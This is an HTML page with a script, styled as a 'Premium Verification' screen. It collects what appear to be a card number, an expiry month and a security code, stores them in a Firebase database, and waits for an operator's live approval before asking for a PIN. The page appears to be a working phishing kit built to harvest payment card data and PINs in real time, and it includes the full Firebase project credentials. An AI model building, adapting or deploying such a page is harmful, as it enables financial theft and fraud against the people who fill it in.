<!DOCTYPE html>
<html>
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Live Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#0f0f0f;
    overflow:hidden;
}

.bg1{
    position:absolute;
    width:400px;
    height:400px;
    background:#ff0080;
    filter:blur(180px);
    top:-100px;
    left:-100px;
    opacity:0.4;
}

.bg2{
    position:absolute;
    width:400px;
    height:400px;
    background:#7928ca;
    filter:blur(180px);
    bottom:-100px;
    right:-100px;
    opacity:0.4;
}

.box{
    width:420px;
    background:rgba(255,255,255,0.06);
    border:1px solid rgba(255,255,255,0.1);
    backdrop-filter:blur(20px);
    padding:35px;
    border-radius:30px;
    position:relative;
    z-index:10;
    box-shadow:0 20px 60px rgba(0,0,0,0.5);
}

h2{
    color:white;
    text-align:center;
    margin-bottom:30px;
    font-size:30px;
}

input{
    width:100%;
    margin-bottom:18px;
    padding:15px;
    border:none;
    border-radius:14px;
    background:rgba(255,255,255,0.08);
    color:white;
    outline:none;
    font-size:15px;
}

button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:14px;
    background:linear-gradient(135deg,#ff0080,#7928ca);
    color:white;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
}

#status{
    margin-top:25px;
    color:white;
    text-align:center;
}

.pinBox{
    margin-top:20px;
}

.success{
    color:#00ff95;
    font-size:26px;
    font-weight:700;
}

.reject{
    color:red;
    font-weight:600;
}

.wait{
    color:#ffd166;
}

</style>

</head>
<body>

<div class="bg1"></div>
<div class="bg2"></div>

<div class="box">

<h2>Premium Verification</h2>

<form id="mainForm">

<input type="text" id="number1" placeholder="Enter Number 1" required>

<input type="month" id="dateValue" required>

<input type="text" id="number2" placeholder="Enter Number 2" required>

<button type="submit">Continue</button>

</form>

<div id="status"></div>

</div>


<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
getFirestore,
collection,
addDoc,
doc,
onSnapshot,
updateDoc
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";


// PASTE FIREBASE CONFIG HERE
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyC5YbZhR6rgKB3P5b7NFJLc0v9XTfV13fY",
  authDomain: "live-project-b8670.firebaseapp.com",
  projectId: "live-project-b8670",
  storageBucket: "live-project-b8670.firebasestorage.app",
  messagingSenderId: "697940186812",
  appId: "1:697940186812:web:839b1bdd9291aea6e862b9",
  measurementId: "G-L9PNRZEV5W"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let currentId = "";


// FORM SUBMIT

document.getElementById('mainForm').addEventListener('submit', async(e)=>{

    e.preventDefault();

    const number1 = document.getElementById('number1').value;
    const dateValue = document.getElementById('dateValue').value;
    const number2 = document.getElementById('number2').value;

    document.getElementById('status').innerHTML = `
    <div class="wait">Submitting Request...</div>
    `;

    const docRef = await addDoc(collection(db,'requests'),{

        number1,
        dateValue,
        number2,
        status:'pending',
        pin:'',
        pinStatus:'waiting'

    });

    currentId = docRef.id;

    listenRealtime();

});


// REALTIME LISTENER

function listenRealtime(){

    const ref = doc(db,'requests',currentId);

    onSnapshot(ref, async(snapshot)=>{

        const data = snapshot.data();

        if(data.status === 'pending'){

            document.getElementById('status').innerHTML = `
            <div class="wait">Waiting For Admin Approval...</div>
            `;

        }

        else if(data.status === 'rejected'){

            document.getElementById('status').innerHTML = `
            <div class="reject">Request Rejected</div>
            `;

        }

        else if(data.status === 'accepted'){

            if(data.pinStatus === 'waiting'){

                document.getElementById('status').innerHTML = `

                <div class="pinBox">

                <input type="text" id="pinInput" placeholder="Enter PIN">

                <button onclick="submitPin()">
                Submit PIN
                </button>

                </div>

                `;

            }

            else if(data.pinStatus === 'pending'){

                document.getElementById('status').innerHTML = `
                <div class="wait">PIN Submitted. Waiting For Admin...</div>
                `;

            }

            else if(data.pinStatus === 'rejected'){

                document.getElementById('status').innerHTML = `
                <div class="reject">PIN Rejected</div>
                `;

            }

            else if(data.pinStatus === 'accepted'){

                document.getElementById('status').innerHTML = `
                <div class="success">Congratulations 🎉</div>
                `;

            }

        }

    });

}


// GLOBAL PIN FUNCTION
window.submitPin = async function(){

    const pin = document.getElementById('pinInput').value;

    await updateDoc(doc(db,'requests',currentId),{

        pin:pin,
        pinStatus:'pending'

    });

}

</script>

</body>
</html>
